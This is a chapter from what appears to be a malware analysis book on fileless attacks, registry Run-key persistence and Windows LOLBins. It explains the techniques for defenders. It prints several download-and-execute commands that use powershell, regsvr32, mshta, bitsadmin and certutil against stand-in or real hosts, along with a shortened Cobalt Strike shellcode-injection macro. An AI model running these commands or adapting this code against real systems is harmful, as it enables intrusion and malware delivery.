<html><head></head><body>
<section epub:type="chapter" role="doc-chapter" aria-labelledby="ch15">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_289" aria-label="289"/>&#13;
<hgroup>&#13;
&#13;
<h2 class="CHAPTER" id="ch15">&#13;
<span class="CN"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">15</samp></span>&#13;
<span class="CT"><samp class="SANS_Dogma_OT_Bold_B_11">FILELESS, LIVING OFF THE LAND, AND ANTI-FORENSICS TECHNIQUES</samp></span>&#13;
</h2>&#13;
</hgroup>&#13;
<figure class="opener"><img class="opener" src="../images/opener.jpg" alt=""/></figure>&#13;
<p class="TNI2">No matter how covert modern malware is designed to be, it’s always bound to leave at least trace evidence of its existence in the victim environment. That evidence might be a persistence mechanism, such as a system startup task or service, or simply a file dropped to disk during the attack. In the latter case, once a file is on disk, defenses such as anti-malware have a better opportunity to detect the malware and thwart the attack. Trace evidence also can give investigators an edge in analyzing the attack post compromise. Malware authors, realizing this, have turned to fileless malware and anti-forensics techniques.</p>&#13;
<p class="TX"><i>Fileless malware</i>, sometimes called <i>memory-resident malware</i>, is malware that doesn’t create or tamper with files on the hard disk; instead, <span role="doc-pagebreak" epub:type="pagebreak" id="pg_290" aria-label="290"/>its artifacts reside only in memory. More broadly, the term <i>fileless attack</i> denotes that the entire attack chain (or at least substantial parts of it) is fileless. Fileless attacks make malware detection more difficult for host defenses like anti-malware and make analysis more difficult for forensics investigators trying to understand the scope and impact of the attack. These attacks take advantage of techniques such as process injection, described in <span class="Xref"><a href="chapter12.xhtml">Chapter 12</a></span>, and Living Off The Land Binaries (LOLBins), discussed later in this chapter.</p>&#13;
<p class="TX"><i>Anti-forensics</i> is a class of techniques in which the attacker attempts to conceal or remove traces of the attack in order to inhibit future forensics investigations. An attacker may instruct their malware to terminate itself and remove traces in memory, delete or corrupt files on disk, clear or tamper with logs and evidence, or even completely destroy the victim system, all in an attempt to inhibit future investigations. We’ll discuss anti-forensics later in this chapter. First, let’s dive deeper into fileless attacks.</p>&#13;
<section epub:type="division" aria-labelledby="sec1">&#13;
&#13;
<h3 class="H1" id="sec1"><span id="h-245"/><samp class="SANS_Futura_Std_Bold_B_11">How Fileless Attacks Work</samp></h3>&#13;
<p class="TNI1">While traditional malware threats often rely on files being written to the disk, fileless malware runs entirely (or nearly entirely) in memory to leave as little footprint on the victim host as possible. <a href="chapter15.xhtml#fig15-1">Figure 15-1</a> illustrates a hypothetical but realistic fileless attack.</p>&#13;
<p class="TX">Let’s break this attack down step by step. First, the malware author sends an email containing a malicious Microsoft Word document to the victim. The victim user happily opens the document (as people often do), which subsequently executes an embedded <i>Visual Basic for Applications</i> (<i>VBA) script</i>: a piece of code that can be embedded in legitimate documents to automate frequent tasks but is often abused for more malevolent purposes. The embedded VBA script invokes a built-in Windows utility called <i>certutil.exe</i> that downloads an encoded PowerShell script from the attacker’s staging server. Once the encoded script has downloaded, certutil decodes it and the script is executed using <i>powershell.exe</i>. This PowerShell script writes code to the Windows registry that will be executed upon a system reboot. Shortly thereafter, the victim user shuts down their laptop for the evening and heads home.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_291" aria-label="291"/>&#13;
<figure class="IMG"><img class="img100" id="fig15-1" src="../images/fig15-1.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-1: A fileless attack</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">Fast-forward 12 hours, when the user boots up their laptop to prepare for a new workday. Upon system boot-up, the malicious code stored inside the registry executes. It contains an obfuscated PowerShell command that downloads another script from the attacker’s staging server. This script is injected into the running PowerShell process, leaving no files on disk. The downloaded script contains bytecode that forms an executable in memory, which is then injected into a new process (<i>malware.exe</i>). The malware payload is an infostealer variant that begins harvesting sensitive data from the host.</p>&#13;
<p class="TX">This attack may seem overly complex, but to anyone who has experience in analyzing fileless attacks, it’s not at all far-fetched. In this scenario, there are a few interesting techniques being used. First, a malicious command is written to and stored in the registry. Fileless malware sometimes uses the registry to store commands, code, or configuration information in order to avoid writing new files to the disk. Since the registry is stored on disk in a proprietary binary format and is only in a human-readable state while resident in memory, this is still considered a fileless technique (see <span role="doc-pagebreak" epub:type="pagebreak" id="pg_292" aria-label="292"/>the “<span class="Xref">The Paradox of Fileless Attacks</span>” box for more on this). Malware that hides in the registry is sometimes called <i>registry-resident malware</i> (which is a subcategory of fileless malware, but I’ll touch on that in a moment). The PowerShell command that executed from the registry also downloads and executes malicious code completely in memory.</p>&#13;
<p class="TX">Second, the Windows utilities invoked in this attack (<i>certutil.exe</i> and <i>powershell.exe</i>, specifically) can be classified as LOLBins, legitimate utilities that are built into Windows or otherwise already available on a target system. These utilities are used for common tasks such as system administration and maintenance, but they also can be easily abused to execute unauthorized code and hide malicious actions. Fileless attacks often take advantage of LOLBins, some of which can be invoked by malware to execute code in memory.</p>&#13;
<aside class="box" aria-label="box-11">&#13;
<p class="BoxTitle" id="box-11"><samp class="SANS_Dogma_OT_Bold_B_11">THE PARADOX OF FILELESS ATTACKS</samp></p>&#13;
<p class="BoxBodyFirst"><samp class="SANS_Futura_Std_Book_11">Fileless and memory-resident attacks aren’t always truly fileless or only in memory. As noted earlier, you could argue that since the registry exists on the disk, an attack that stores malicious commands in the registry can’t be considered a true fileless attack. This is technically true. However, since the contents of the registry hives aren’t readable while on disk but only while loaded in memory, this still qualifies as fileless. Additionally, many fileless attacks require an initial attack vector, such as a phishing email containing a malicious Microsoft Office attachment, as in the scenario just described. While this attack isn’t completely fileless (there’s an email and a Word file, for instance),</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">most</samp> <samp class="SANS_Futura_Std_Book_11">of the attack chain resides completely in memory.</samp></p>&#13;
<p class="Boxtext"><samp class="SANS_Futura_Std_Book_11">Even though there’s some nuance here, the takeaway is that fileless attacks aim to</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">limit</samp> <samp class="SANS_Futura_Std_Book_11">actions on the disk or avoid leaving any disk footprints that could assist forensics investigators or endpoint defenses. If there are files that must be dropped to disk to support the attack, the malware author tries to obfuscate or encrypt them as much as possible to bypass signature-based detection.</samp></p>&#13;
</aside>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec2">&#13;
&#13;
<h3 class="H1" id="sec2"><span id="h-246"/><samp class="SANS_Futura_Std_Bold_B_11">Persistence and Registry-Resident Malware</samp></h3>&#13;
<p class="TNI1">In the fileless attack scenario just described, the malware wrote a PowerShell command to the registry and set it to autostart on the next boot-up. The Windows registry can provide a safe place for malware to hide because it is unlikely to be discovered there, at least by someone who doesn’t know specifically what to look for. Not only that, but anti-malware and other endpoint defenses also may not be configured to scan the registry for malware.</p>&#13;
<p class="TX">This technique is one way malware tries to establish <i>persistence</i>: that is, remaining on an infected host even after a system reboot. Malware can use <span role="doc-pagebreak" epub:type="pagebreak" id="pg_293" aria-label="293"/>any of several tactics to persist on a victim system, but here we’ll focus on registry persistence because it ties in directly with registry-resident malware.</p>&#13;
<p class="TX"><samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp> are special registry keys that are invoked when a user logs in to a system. They can point to file types like executable files and scripts and even accept command line parameters. They reside in the following registry locations:</p>&#13;
<ul class="ul">&#13;
<li class="BL"><i>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</i></li>&#13;
<li class="BL"><i>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</i></li>&#13;
<li class="BL"><i>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</i></li>&#13;
<li class="BL"><i>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</i></li>&#13;
</ul>&#13;
<p class="TX">The <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys are invoked each time the user logs in. The <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp> keys are invoked only one time, at the next login. Each key consists of a name and a value that represents a command to be run or a file to be executed.</p>&#13;
<p class="TX">By manipulating these keys, a malware author can execute malware and its associated commands directly from the registry. To demonstrate, I’ve added a new <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> key named <samp class="SANS_TheSansMonoCd_W5Regular_11">Evil</samp> to the registry key <i>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</i>. <a href="chapter15.xhtml#fig15-2">Figure 15-2</a> shows this key, which can be viewed and edited with <i>regedit.exe</i>.</p>&#13;
<figure class="IMG"><img class="img100" id="fig15-2" src="../images/fig15-2.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-2: Adding a new malicious Run key to the registry</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">This key simply invokes <i>powershell.exe</i> and executes the <samp class="SANS_TheSansMonoCd_W5Regular_11">pause</samp> command. Now, every time I log in to my machine, a PowerShell prompt appears. Obviously, a malware author would rather do something a little more malicious than simply popping up a PowerShell prompt at each login. They might execute a more complex command like the following:</p>&#13;
<pre class="pre-130"><code>powershell.exe -C "IEX(New-Object Net.WebClient).DownloadString('https://evil.com/evil.ps1')"</code></pre>&#13;
<p class="TX">Once executed, when the user of the system logs in to Windows, this command downloads a PowerShell script (<i>evil.ps1)</i> from a remote web server (<i>evil.com)</i> and executes it directly in memory. We won’t touch on this command anymore here, as we’ll be covering PowerShell in more detail later in this chapter, but just keep in mind that malware can easily hide commands and code inside the registry, and using <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> and <samp class="SANS_TheSansMonoCd_W5Regular_11">RunOnce</samp> keys is one way it can do so. <a href="chapter15.xhtml#tab15-1">Table 15-1</a> shows a non-exhaustive list of other <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys and persistence locations in the registry.</p>&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_294" aria-label="294"/>&#13;
<p class="TT" id="tab15-1"><span class="Heavy"><samp class="SANS_Futura_Std_Heavy_B_11">Table 15-1:</samp></span> <samp class="SANS_Futura_Std_Book_11">Registry Keys Malware May Use to Establish Persistence</samp></p>&#13;
<table class="Basic-Table">&#13;
<thead>&#13;
<tr>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Registry hive/key</samp></p></th>&#13;
<th class="TCH" scope="col"><p class="TCH1"><samp class="SANS_Futura_Std_Heavy_B_11">Description</samp></p></th>&#13;
</tr>&#13;
</thead>&#13;
<tbody>&#13;
<tr>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr/>Software\<wbr/>Microsoft\<wbr/>Windows\<br/>CurrentVersion\<wbr/>Policies\<wbr/>Explorer\<wbr/>Run</samp></p>&#13;
<p class="TB1-TOP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr/>Software\<wbr/>Microsoft\<wbr/>Windows\<br/>CurrentVersion\<wbr/>Policies\<wbr/>Explorer\<wbr/>Run</samp></p></td>&#13;
<td class="TBF"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">These</samp> <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> <samp class="SANS_Futura_Std_Book_11">keys are similar to the keys already mentioned. Anything added to them will run upon user login. They are not created by default in Windows and so must be added manually.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKCU\<wbr/>Software\<wbr/>Microsoft\<wbr/>Windows NT\<br/>CurrentVersion\<wbr/>Winlogon</samp></p>&#13;
<p class="TB1-TOP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr/>Software\<wbr/>Microsoft\<wbr/>Windows NT\<br/>CurrentVersion\<wbr/>Winlogon</samp></p></td>&#13;
<td class="TB"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">These keys contain Windows login configurations, including programs that execute upon login. These can be modified to run malware or malicious commands.</samp></p></td>&#13;
</tr>&#13;
<tr>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr/>System\<wbr/>CurrentControlSet\<wbr/>Services</samp></p></td>&#13;
<td class="TBL"><p class="TB1"><samp class="SANS_Futura_Std_Book_11">This key contains information on the services configured on the host. Drivers are included here as well, in</samp> <samp class="SANS_Futura_Std_Book_Oblique_I_11">HKLM\<wbr/>SYSTEM\<wbr/>CurrentControlSet\​Services\<wbr/>&lt;DriverName&gt;</samp><samp class="SANS_Futura_Std_Book_11">. If malware installs a persistence mechanism (or malicious driver) as a service, this can be seen here.</samp></p></td>&#13;
</tr>&#13;
</tbody>&#13;
</table>&#13;
<p class="TX">This is only the very tip of the persistence mechanisms iceberg. The <samp class="SANS_TheSansMonoCd_W5Regular_11">Run</samp> keys described here are some of the most commonly used for fileless persistence techniques, but there are others. For more information, visit the MITRE ATT&amp;CK site at <a href="https://attack.mitre.org/tactics/TA0003/"><i>https://<wbr/>attack<wbr/>.mitre<wbr/>.org<wbr/>/tactics<wbr/>/TA0003<wbr/>/</i></a>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec3">&#13;
&#13;
<h3 class="H1" id="sec3"><span id="h-247"/><samp class="SANS_Futura_Std_Bold_B_11">Living Off The Land Binaries</samp></h3>&#13;
<p class="TNI1">Now let’s turn to another technique malware might use to launch fileless attacks: LOLBins. There are several reasons why malware might invoke a LOLBin:</p>&#13;
<p class="ListHead"><b>To bypass application restriction controls, such as AppLocker</b></p>&#13;
<p class="ListPlainFirst">AppLocker is a Windows security control for preventing unwanted applications from executing. Malware can bypass it by using system binaries as a proxy.</p>&#13;
<p class="ListHead"><b>To avoid detection</b></p>&#13;
<p class="ListPlainFirst">EDR, anti-malware, and other endpoint defenses subject LOLBins to less scrutiny, since they’re often digitally signed and therefore verified by the operating system itself. Additionally, many LOLBins allow malicious code to execute in memory, which builds its evasion potency further.</p>&#13;
<p class="ListHead"><b>To hide in the noise</b></p>&#13;
<p class="ListPlainFirst">Since daily sysadmin work requires the use of many LOLBins, it’s difficult to develop sound logic to detect the malicious use of these tools; the amount of noise they generate can be challenging for analysts to sift through.</p>&#13;
<p class="ListHead"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_295" aria-label="295"/><b>To hamper investigations</b></p>&#13;
<p class="ListPlainFirst">Since many LOLBins actually allow the execution of malicious code in memory and support fileless attacks, investigating these attacks can sometimes be more difficult than it is for those that leave a larger footprint on disk.</p>&#13;
<div class="spc"/>&#13;
<p class="TX">The classification of LOLBins can be quite subjective. Some experts claim that LOLBins are legitimate applications that can be abused by threat actors in unexpected ways. However, this definition would eliminate all applications that can be abused by actors in “expected” ways (invoking <i>cmd.exe</i> to delete a file, for example). My school of thought is truer to the essence of an attacker “living off the land,” meaning that an attacker can and will use anything available to them, and “expected” and “unexpected” use cases aren’t taken into account. In my opinion, a LOLBin is any application or tool that is commonly available and can be abused by actors. Let’s look at how this is accomplished with the help of VBA code and macros.</p>&#13;
<section epub:type="division" aria-labelledby="sec4">&#13;
&#13;
<h4 class="H2" id="sec4"><span id="h-248"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">VBA Macro-Based Malware</samp></h4>&#13;
<p class="TNI1">Living off the land techniques often begin with a malware-laced document that triggers the LOLBin’s attack chain. Such documents are commonly (but not always) Microsoft Word or Excel documents, and their malicious code is frequently in the form of VBA macros. <i>Macros</i> were originally designed to automate common user tasks in a document file, but as you’ll see, they’re also used by threat actors to deploy additional malware.</p>&#13;
<blockquote>&#13;
<p class="Note"><span class="NoteHead"><samp class="SANS_Dogma_OT_Bold_B_15">NOTE</samp></span></p>&#13;
</blockquote>&#13;
<p class="NOTE-TXT"><i>At the time of this writing, the abuse of VBA macros for malicious purposes has significantly decreased. By default, Microsoft Office now prevents macro execution from documents originating from untrusted sources, so this attack vector is more difficult to actualize. However, actors may be able to bypass these limitations or use other document formats, such as Rich Text Format (RTF) and Portable Document Format (PDF), to achieve similar effects.</i></p>&#13;
<p class="TX">VBA macro code is quite powerful; it can even import Windows DLLs and call WinAPI functions. For example, the attack tool Cobalt Strike uses a macro embedded inside a Microsoft Office document to inject shellcode into a running process and download an additional payload (called a <i>beacon</i>) from a malicious web server. Here’s an example of the Cobalt Strike stager macro code, which has been slightly modified for readability and brevity:</p>&#13;
<pre class="pre-131"><code>shellcode = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,&#13;
82,20,-117, ... ) <span class="Code_CodeAnnotation" aria-label="annotation1">❶</span>&#13;
&#13;
  If Len(Environ("ProgramW6432")) &gt; 0 Then <span class="Code_CodeAnnotation" aria-label="annotation2">❷</span>&#13;
    sProc = Environ("windir") &amp; "\\SysWOW64\\rundll32.exe"&#13;
  Else&#13;
    sProc = Environ("windir") &amp; "\\System32\\rundll32.exe"&#13;
  End If&#13;
&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_296" aria-label="296"/>res = CreateProcessA(..., sProc, ..., ..., ..., ..., ..., ..., ... ) <span class="Code_CodeAnnotation" aria-label="annotation3">❸</span>&#13;
&#13;
rwxpage = VirtualAllocEx(pInfo.hProcess, 0, UBound(shellcode), &amp;H1000, &amp;H40) <span class="Code_CodeAnnotation" aria-label="annotation4">❹</span>&#13;
&#13;
For offset = LBound(shellcode) To Ubound(shellcode) <span class="Code_CodeAnnotation" aria-label="annotation5">❺</span>&#13;
  myByte = shellcode(offset)&#13;
  res = WriteProcessMemory(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)&#13;
  Next offset&#13;
&#13;
<samp class="SANS_TheSansMonoCd_W5Regular_11">res = CreateRemoteThread(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0) </samp><span class="Code_CodeAnnotation" aria-label="annotation6">❻</span></code></pre>&#13;
<p class="TX">There’s a lot going on here, so let’s go over it block by block. First, this code defines an array of bytes that, when converted to hexadecimal format, is actually malicious shellcode <span class="CodeAnnotation" aria-label="annotation1">❶</span>. Next, the code checks whether the Windows environment is 32- or 64-bit and selects the appropriate directory (System32 for 32-bit architecture and SysWOW64 for 64-bit architecture) from which to invoke the Windows utility <i>rundll32.exe</i> <span class="CodeAnnotation" aria-label="annotation2">❷</span>. The code invokes <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateProcessA</samp> to start an instance of <i>rundll32.exe</i> <span class="CodeAnnotation" aria-label="annotation3">❸</span> and then calls <samp class="SANS_TheSansMonoCd_W5Regular_11">VirtualAllocEx</samp> to allocate memory inside that process <span class="CodeAnnotation" aria-label="annotation4">❹</span>. The allocated region of memory is the same size as the shellcode array.</p>&#13;
<p class="TX">Next, using a <samp class="SANS_TheSansMonoCd_W5Regular_11">for</samp> loop, the code writes each byte of shellcode into the newly allocated memory region using <samp class="SANS_TheSansMonoCd_W5Regular_11">WriteProcessMemory</samp> <span class="CodeAnnotation" aria-label="annotation5">❺</span>. Finally, the macro code executes the injected shellcode inside the context of <i>rundll32.exe</i> by invoking <samp class="SANS_TheSansMonoCd_W5Regular_11">CreateRemoteThread</samp> <span class="CodeAnnotation" aria-label="annotation6">❻</span>. If you remember <span class="Xref"><a href="chapter12.xhtml">Chapter 12</a></span>, you may spot that this is a form of shellcode injection.</p>&#13;
<p class="TX">The <i>rundll32.exe</i> utility is one of the many LOLBins that exist in a Windows environment. (You’ll read more about it shortly.) In this case, the Cobalt Strike stager is using <i>rundll32.exe</i> as a sort of surrogate for its malicious code, hiding the code inside this process and potentially evading endpoint defense controls and pesky security analysts in the process.</p>&#13;
<p class="TX">Next, we’ll discuss another technique to mask malicious code by abusing legitimate Windows utilities through the use of System Binary Proxy Execution.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec5">&#13;
&#13;
<h4 class="H2" id="sec5"><span id="h-249"/><samp class="SANS_Futura_Std_Bold_Condensed_Oblique_I_11">System Binary Proxy Execution</samp></h4>&#13;
<p class="TNI1"><i>System Binary Proxy Execution</i> is a technique for executing code via a legitimate (and often digitally signed) Windows utility. One of the reasons for proxying execution through a signed binary is to bypass application-blocking controls like AppLocker. This type of attack can also help malware fly under the radar of endpoint defenses like anti-malware. This technique can abuse these file types:</p>&#13;
<ul class="ul">&#13;
<li class="BL">Binaries that are included by default in most Windows installations and thus exist in the vast majority of victim environments.</li>&#13;
<li class="BL">Binaries that are not included by default in Windows but are still very common. Examples are PSExec, a popular tool for system administration, and ProcDump, a tool for dumping the memory of a target process. As these utilities may or may not exist in the victim environment <span role="doc-pagebreak" epub:type="pagebreak" id="pg_297" aria-label="297"/>prior to the attack, they may need to be transferred to the victim system before being invoked. They won’t be discussed further in this book.</li>&#13;
</ul>&#13;
<p class="TX">Let’s start taking a look at some of the most commonly used LOLBins for proxying execution.</p>&#13;
<section epub:type="division" aria-labelledby="sec6">&#13;
&#13;
<h5 class="H3" id="sec6"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Rundll32</samp></h5>&#13;
<p class="TNI1"><i>Rundll32</i>, which you saw in the Cobalt Strike example, is an important binary used by many Windows applications to execute code from DLLs. If an application requires a specific DLL but does not load it directly (via <samp class="SANS_TheSansMonoCd_W5Regular_11">LoadLibrary</samp>, for example), it can invoke <i>rundll32.exe</i> and a specific exported function, like so:</p>&#13;
<pre class="pre-132"><code>C:\&gt; rundll32.exe library.dll,ExportedFunction</code></pre>&#13;
<p class="TX">As you can see, rundll32 accepts two parameters: the name and path of the DLL file (in this case, <i>library.dll</i>) and the exported function that will be executed (<samp class="SANS_TheSansMonoCd_W5Regular_11">ExportedFunction</samp>). Malware can abuse <i>rundll32.exe</i> to execute code from a malicious DLL as well:</p>&#13;
<pre class="pre-133"><code>C:\&gt; rundll32.exe C:\Temp\evil.dll,EvilFunction</code></pre>&#13;
<p class="TX">Since rundll32 is run very frequently by the Windows operating system and various other benign processes, it is often used as a surrogate process for malicious code. In the Cobalt Strike stager example, it was spawned and injected with shellcode, then used to host and execute malicious code.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec7">&#13;
&#13;
<h5 class="H3" id="sec7"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Regsvr32</samp></h5>&#13;
<p class="TNI1"><i>Regsvr32</i> is an executable used to register and unregister DLL modules. Malware can take advantage of regsvr32 to execute malicious code within the context of the <i>regsvr32.exe</i> signed binary or even to download and execute malicious code from a remote server.</p>&#13;
<p class="TX">The Emotet malware family is notorious for using LOLBins as part of its attack chain. The payload for one particular strain of Emotet (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: d642109e621c6758027c2fc0e5ea3d1126963a001ab1858b95f82e09403943bd</samp>) was being delivered via malicious Microsoft Excel documents that downloaded multiple payloads and modules and subsequently executed them using <i>regsvr32.exe</i>. <a href="chapter15.xhtml#fig15-3">Figure 15-3</a>, a screenshot from Joe Sandbox, illustrates this attack chain.</p>&#13;
<figure class="IMG"><img class="img100" id="fig15-3" src="../images/fig15-3.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-3: The Emotet process tree shown in Joe Sandbox</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX"><span role="doc-pagebreak" epub:type="pagebreak" id="pg_298" aria-label="298"/>Another notable example of regsvr32 in use is the strangely named Squiblydoo attack, which also leverages the Windows script component runtime DLL <i>scrobj.dll</i> that is normally used to execute local COM scriptlets. By combining the power of <i>regsvr32.exe</i> and <i>scrobj.dll</i>, the Squiblydoo malware downloads and executes a malicious COM scriptlet directly from the internet:</p>&#13;
<pre class="pre-134"><code>C:\&gt; regsvr32.exe /s /i:http://evil.kz/script.sct C:\Windows\System32\scrobj.dll</code></pre>&#13;
<p class="TX">This command downloads the malicious script <i>script.sct</i> from <i>http://<wbr/>evil<wbr/>.kz</i> and subsequently executes it using <i>scrobj.dll</i>, all while hiding inside the process address space of <i>regsvr32.exe</i>, completely in memory. More specifically, the <samp class="SANS_TheSansMonoCd_W5Regular_11">/s</samp> switch tells <i>regsvr32.exe</i> not to display a message to the victim (unwanted behavior for a threat actor). The <samp class="SANS_TheSansMonoCd_W5Regular_11">/i</samp> switch passes the following string (<samp class="SANS_TheSansMonoCd_W5Regular_11">http://evile.kz</samp>...) to the <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp> function inside <i>scrobj.dll</i>.</p>&#13;
<p class="TX">This technique is able to work the way it does because the <samp class="SANS_TheSansMonoCd_W5Regular_11">DllInstall</samp> function inside the <i>scrobj.dll</i> file accepts a URL and blindly downloads and executes the script file. You can read more about the Squiblydoo technique at the MITRE Cyber Analytics Repository (CAR) at <a href="https://car.mitre.org/analytics/CAR-2019-04-003/"><i>https://<wbr/>car<wbr/>.mitre<wbr/>.org<wbr/>/analytics<wbr/>/CAR<wbr/>-2019<wbr/>-04<wbr/>-003<wbr/>/</i></a>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec8">&#13;
&#13;
<h5 class="H3" id="sec8"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Mshta</samp></h5>&#13;
<p class="TNI1">Mshta is used to execute <i>HTML application</i> (.<i>hta</i>) files, which are script files that can contain HTML, VBScript, JavaScript, or other types of scripts. HTA files provide a GUI via HTML, and the script code provides the logic for the application. Malware often uses <i>mshta.exe</i> to download and execute files from remote servers, as in the following example from a malware-dropping Microsoft Excel file:</p>&#13;
<pre class="pre-135"><code>C:\&gt; mshta.exe https://www.mediafire.com/file/bcl9/2.htm/file</code></pre>&#13;
<p class="TX">One particular malware sample (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256: 03f03a3f36c87d8cb7cd5f8ce6e324917253eeca4f3ea164f35242146e26e2b1</samp>) invokes <i>mshta.exe</i> via <i>rundll32.exe</i>, demonstrating how some attacks chain multiple LOLBins together. <a href="chapter15.xhtml#fig15-4">Figure 15-4</a> shows the report from Joe Sandbox (<i><a href="https://www.joesandbox.com/analysis/670279">https://www.joesandbox.com/analysis/670279</a></i>).</p>&#13;
<figure class="IMG"><img class="img100" id="fig15-4" src="../images/fig15-4.jpg" alt=""/>&#13;
<figcaption><p class="CAP"><samp class="SANS_Futura_Std_Book_Oblique_I_11">Figure 15-4: A LOLBin attack chain shown in an analysis report from Joe Sandbox</samp></p></figcaption>&#13;
</figure>&#13;
<p class="TX">In this sandbox analysis, you can see that a Microsoft Excel document spawns <i>rundll32.exe</i> (likely via embedded VBA code or a similar technique), which subsequently invokes <i>mshta.exe</i> to download and execute a file hosted on <i>mediafire.net</i>.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec9">&#13;
<span role="doc-pagebreak" epub:type="pagebreak" id="pg_299" aria-label="299"/>&#13;
<h5 class="H3" id="sec9"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">BITSAdmin</samp></h5>&#13;
<p class="TNI1"><i>Background Intelligence Transfer Service (BITS)</i> is used to transfer files to and from web servers and file shares. BITS can be configured in “jobs” that automatically manage the file transfer overhead, monitoring network usage, latency, and file sizes and allowing file transfers to be paused and resumed. The BITSAdmin application, <i>bitsadmin.exe</i>, is used to manage BITS.</p>&#13;
<p class="TX">Malware can abuse BITS to download and execute payloads from remote servers. The following command will create a new file transfer job called <samp class="SANS_TheSansMonoCd_W5Regular_11">myjob</samp> as a high priority, then download the file <i>malicious.exe</i> from the domain <i>evil.uk</i>, saving it in the <i>C:\Users\AppData\Roaming</i> directory:</p>&#13;
<pre class="pre-136"><code>C:\&gt; bitsadmin.exe /transfer myjob /download /priority high&#13;
http://evil.uk/malicious.exe C:\Users\AppData\Roaming\malicious.exe</code></pre>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec10">&#13;
&#13;
<h5 class="H3" id="sec10"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">InstallUtil</samp></h5>&#13;
<p class="TNI1"><i>InstallUtil</i> is a component of the Windows .NET framework and is used by the operating system and other applications to install server resources and services. It can also be used by malware to invoke executable and DLL files. The following command executes <i>evil.dll</i> in the context of <i>installutil.exe</i>:</p>&#13;
<pre class="pre-137"><code>C:\&gt; C:\Windows\Microsoft.NET\Framework\<var>version</var>\installutil.exe /logfile=&#13;
/LogToConsole=false /U evil.dll</code></pre>&#13;
<p class="TX">A host may have many versions of .NET installed, so <samp class="SANS_TheSansMonoCd_W5Regular_Italic_I_11">version</samp> here would be replaced with a specific version such as <samp class="SANS_TheSansMonoCd_W5Regular_11">v4.0.30319</samp>. As with many LOLBins, <i>installutil.exe</i> is often used by system administrators for legitimate reasons, so it’s difficult to prevent this unauthorized usage, especially if it means limiting how administrators do their jobs. It’s better to either limit the user groups who are able to execute this utility or (at the very least) monitor the user groups’ usage of the utility and regularly review the logs.</p>&#13;
</section>&#13;
<section epub:type="division" aria-labelledby="sec11">&#13;
&#13;
<h5 class="H3" id="sec11"><samp class="SANS_Futura_Std_Bold_Condensed_B_11">Certutil</samp></h5>&#13;
<p class="TNI1">The <i>certutil.exe</i> binary is part of the Certificate Services component of Windows and can be used to display information on, verify, configure, and install digital certificates. There are a few interesting ways in which it can be abused by attackers. For instance, a malicious Microsoft Excel document (<samp class="SANS_TheSansMonoCd_W5Regular_11">SHA256:d009299a787cf9b7995827014e72525038eecd3e1f99820d66854fc865d39047</samp>) downloaded and executed a Lokibot payload from a remote server with the following command:</p>&#13;
<pre class="pre-138"><code>C:\&gt; certutil.exe -urlcache -split -f "http://45.155.165.63/tq/loader/uploads/Product_Details&#13;
_018_RFQ.exe" Zcldxvqciopgykje.exe</code></pre>&#13;
